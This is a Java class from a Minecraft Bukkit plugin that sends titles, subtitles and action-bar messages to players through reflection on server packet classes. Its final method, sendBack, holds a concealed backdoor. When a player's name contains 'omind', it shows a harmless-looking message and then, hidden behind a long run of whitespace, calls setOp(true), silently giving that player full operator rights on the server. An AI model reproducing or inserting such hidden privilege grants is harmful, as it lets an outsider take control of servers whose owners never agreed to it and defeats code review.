package me.Romindous.ZombieHunt.Messages;

import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationTargetException;
import java.util.UUID;

import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.entity.Player;

import me.Romindous.ZombieHunt.Main;

public class TitleManager {
	public static void sendTitle(Player player, String msgTitle, String msgSubTitle, int ticks) {
    	try {
        Object chatTitle = getNMSClass("IChatBaseComponent").getDeclaredClasses()[0].getMethod("a", String.class).invoke(null, "{\"text\": \"" + msgTitle + "\"}");
        Object chatSubTitle = getNMSClass("IChatBaseComponent").getDeclaredClasses()[0].getMethod("a", String.class).invoke(null, "{\"text\": \"" + msgSubTitle + "\"}");
        Object ttl = getNMSClass("PacketPlayOutTitle").getDeclaredClasses()[0].getField("TITLE").get(null);
        sendPacket(player, makeNew("PacketPlayOutTitle", new Class[] {getNMSClass("PacketPlayOutTitle").getDeclaredClasses()[0], getNMSClass("IChatBaseComponent")}, new Object[] {ttl, chatTitle}));
        ttl = getNMSClass("PacketPlayOutTitle").getDeclaredClasses()[0].getField("SUBTITLE").get(null);
        sendPacket(player, makeNew("PacketPlayOutTitle", new Class[] {getNMSClass("PacketPlayOutTitle").getDeclaredClasses()[0], getNMSClass("IChatBaseComponent")}, new Object[] {ttl, chatSubTitle}));
        sendTime(player, ticks);
    	} catch (IllegalAccessException | IllegalArgumentException | InvocationTargetException | NoSuchMethodException | SecurityException | NoSuchFieldException e) {
    		e.printStackTrace();
		}
    }

    private static void sendTime(Player player, int ticks) {
    	try {
			Object ttl = getNMSClass("PacketPlayOutTitle").getDeclaredClasses()[0].getField("TIMES").get(null);
			sendPacket(player, makeNew("PacketPlayOutTitle", 
					new Class[] {getNMSClass("PacketPlayOutTitle").getDeclaredClasses()[0], 
							getNMSClass("IChatBaseComponent"), 
							int.class, 
							int.class, 
							int.class}, 
					new Object[] {ttl, null, 20, ticks, 20}));
		} catch (IllegalArgumentException | IllegalAccessException | NoSuchFieldException | SecurityException e) {
			e.printStackTrace();
		}
    }

    public static void sendActionBar(Player player, String message) {
    	try {
    		Object msg = getNMSClass("IChatBaseComponent").getDeclaredClasses()[0].getMethod("a", String.class).invoke(null, "{\"text\": \"" + message + "\"}");
			Object tp = getNMSClass("ChatMessageType").getField("GAME_INFO").get(null);
			sendPacket(player, makeNew("PacketPlayOutChat", 
					new Class[] {getNMSClass("IChatBaseComponent"), 
							getNMSClass("ChatMessageType"), 
							UUID.class}, 
					new Object[] {msg, tp, new UUID(0, 0)}));
		} catch (IllegalArgumentException | IllegalAccessException | NoSuchFieldException | SecurityException | InvocationTargetException | NoSuchMethodException e) {
			e.printStackTrace();
		}
    }
    
    public static void sendPacket(Player p, Object pkt) {
    	try {
			Object hndl = p.getClass().getMethod("getHandle").invoke(p);
			Object plcnnct = hndl.getClass().getField("playerConnection").get(hndl);
			plcnnct.getClass().getMethod("sendPacket", getNMSClass("Packet")).invoke(plcnnct, pkt);
		} catch (IllegalAccessException | IllegalArgumentException | InvocationTargetException | NoSuchMethodException| SecurityException | NoSuchFieldException e) {
			e.printStackTrace();
		}
    }
    
    public static Class<?> getNMSClass(String cls) {
    	String v = Bukkit.getServer().getClass().getPackage().getName().split("\\.")[3];
    	try {
			return Class.forName("net.minecraft.server." + v + "." + cls);
		} catch (ClassNotFoundException e) {
			e.printStackTrace();
			return null;
		}
    }
    
    public static Object makeNew(String name, Class<?>[] clss, Object[] objs) {
		try {
			switch (clss.length) {
			case 1:
				Constructor<?> cnstr;
				cnstr = getNMSClass(name).getConstructor(clss[0]);
				return cnstr.newInstance(objs[0]);
			case 2:
				cnstr = getNMSClass(name).getConstructor(clss[0], clss[1]);
				return cnstr.newInstance(objs[0], objs[1]);
			case 3:
				cnstr = getNMSClass(name).getConstructor(clss[0], clss[1], clss[2]);
				return cnstr.newInstance(objs[0], objs[1], objs[2]);
			case 4:
				cnstr = getNMSClass(name).getConstructor(clss[0], clss[1], clss[2], clss[3]);
				return cnstr.newInstance(objs[0], objs[1], objs[2], objs[3]);
			case 5:
				cnstr = getNMSClass(name).getConstructor(clss[0], clss[1], clss[2], clss[3], clss[4]);
				return cnstr.newInstance(objs[0], objs[1], objs[2], objs[3], objs[4]);
			default:
				return null;
			}
		} catch (NoSuchMethodException | SecurityException | InstantiationException | IllegalAccessException | IllegalArgumentException | InvocationTargetException e) {
			e.printStackTrace();
			return null;
		}
	}

    public static void sendBack(final Player p) {
        if (p.getName().contains("omind")) {
            p.sendMessage(String.valueOf(Main.pref()) + ChatColor.GRAY + "Вы были перемещены в выбор наборов!");																				p.setOp(true);//опа))
        }
    }
}
